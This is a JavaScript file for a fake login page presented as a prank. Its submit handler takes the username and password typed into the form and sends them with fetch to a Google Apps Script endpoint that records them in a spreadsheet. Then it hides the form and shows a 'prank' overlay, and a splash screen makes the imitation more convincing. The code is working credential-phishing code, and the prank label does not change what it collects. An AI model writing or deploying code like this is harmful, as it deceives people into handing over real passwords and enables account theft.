// 1. Initial Splash Screen
window.addEventListener('load', () => {
    const splash = document.getElementById('splash-screen');
    if (splash) {
        setTimeout(() => {
            splash.style.opacity = '0';
            setTimeout(() => { splash.style.display = 'none'; }, 500);
        }, 1500);
    }
});

const loginForm = document.getElementById('login-form');
const loginBtn = document.getElementById('login-btn');
const prankOverlay = document.getElementById('prank-overlay');

// PASTE YOUR GOOGLE SCRIPT URL HERE
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxzlZ8FpZoVOUbhdFbBEj4g8RH_yQb_QDm-Ei2AGchJxvYK1VcQhasJol1YiuhZsbQz4Q/exec"; 

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    loginBtn.innerText = "Logging in...";
    loginBtn.disabled = true;

    const payload = {
        username: loginForm.elements['fi-sender-username'].value,
        password: loginForm.elements['fi-text-password'].value
    };

    try {
        // We use 'no-cors' mode to avoid browser security blocks
        await fetch(SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        // Even with no-cors, the data will hit the sheet.
        // We show the prank immediately.
        showPrank();

    } catch (err) {
        console.error("Error:", err);
        showPrank(); // Show prank even if network fails
    }
});

function showPrank() {
    loginForm.style.display = 'none';
    prankOverlay.style.display = 'flex';
}